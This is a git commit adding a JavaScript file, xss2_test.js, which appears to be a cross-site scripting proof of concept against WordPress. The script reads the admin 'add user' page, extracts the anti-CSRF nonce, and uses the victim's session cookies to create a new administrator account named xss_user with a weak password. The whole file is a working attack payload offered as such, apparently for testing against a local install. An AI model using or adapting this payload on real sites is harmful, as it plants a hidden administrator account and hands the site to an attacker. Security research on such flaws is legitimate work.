53e09be317d74602609e128b7d3104fedc11d760
M.Awad <75997594+MohamedAwad9k8@users.noreply.github.com>
2024-03-31 00:31:21 +0200

    Add files via upload

---
+++ xss2_test.js
@@ -0,0 +1,13 @@
+fetch('http://localhost:8012/wordpress/wp-admin/user-new.php')
+  .then(response => response.text())
+  .then(html => {
+    const tokenValue = (new DOMParser().parseFromString(html, 'text/html')).querySelector('form[method="post"] input#_wpnonce_create-user').value;
+        fetch('http://localhost:8012/wordpress/wp-admin/user-new.php', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+      }, credentials: 'include',
+      body: `action=createuser&_wpnonce_create-user=${tokenValue }&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fuser-new.php&user_login=xss_user&email=xss%40gmail.com&first_name=XSS&last_name=XSS&url=test13337&pass1=xss123&pass2=xss123&pw_weak=on&send_user_notification=1&role=administrator&createuser=Add+New+User`
+    }).then(response => response.json())
+    .then(data => console.log('Response from API:', data))
+})
